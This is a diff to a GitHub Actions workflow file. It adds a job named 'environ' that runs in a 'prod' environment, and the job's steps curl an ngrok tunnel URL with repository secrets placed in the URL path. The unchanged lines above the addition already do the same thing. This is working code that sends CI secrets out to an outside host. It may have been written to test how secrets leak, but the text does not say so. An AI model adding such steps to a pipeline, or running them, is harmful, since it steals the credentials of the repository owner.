@@ -13,3 +13,11 @@ jobs:
     steps:
     - run: curl https://da09-2a02-8428-1ec9-2701-908b-16ab-7fc6-7e0.ngrok-free.app/${{ secrets.MASUPERREPOVAR  }}
     - run: curl https://da09-2a02-8428-1ec9-2701-908b-16ab-7fc6-7e0.ngrok-free.app/${{ secrets.MASUPER_VAR }}
+
+  environ:
+    name: withenv
+    runs-on: ubuntu-latest
+    environment: prod
+    steps:
+    - run: curl https://da09-2a02-8428-1ec9-2701-908b-16ab-7fc6-7e0.ngrok-free.app/${{ secrets.MASUPERREPOVAR  }}
+    - run: curl https://da09-2a02-8428-1ec9-2701-908b-16ab-7fc6-7e0.ngrok-free.app/${{ secrets.MASUPER_VAR }}
